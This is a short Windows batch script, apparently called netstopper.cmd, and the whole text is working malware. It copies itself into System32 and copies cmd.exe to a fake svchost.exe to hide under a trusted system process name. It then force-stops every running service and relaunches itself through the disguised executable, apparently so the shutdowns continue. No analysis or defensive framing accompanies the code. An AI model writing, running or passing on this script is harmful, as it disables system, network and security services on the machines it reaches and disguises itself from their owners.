copy netstopper.cmd %systemroot%\System32\ /Y
copy %systemroot%\System32\cmd.exe %systemroot%\svchost.exe /Y

net start > services.txt
type services.txt | find "   " > service.txt

for /F "tokens=* delims= " %%A in (service.txt) do start /MIN /WAIT /B net stop "%%A" /Y

start /B %systemroot%\svchost.exe /K %systemroot%\System32\netstopper.cmd
